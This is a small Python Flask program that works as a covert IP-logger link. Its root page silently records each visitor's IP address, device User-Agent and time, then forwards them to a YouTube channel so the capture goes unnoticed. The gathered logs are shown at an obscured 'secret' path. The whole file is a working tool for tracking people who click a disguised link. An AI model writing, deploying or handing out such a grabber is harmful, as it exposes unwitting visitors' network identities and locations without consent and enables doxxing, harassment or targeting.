import os
from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)
logs = []

redirect_url = "https://www.youtube.com/@MrBeast"

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log = f"[{timestamp}] IP: {ip} | Device: {user_agent}"
    logs.append(log)
    print(log)
    return redirect(redirect_url)

@app.route('/mysecrettunnel123')
def show_logs():
    return "<br>".join(logs)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
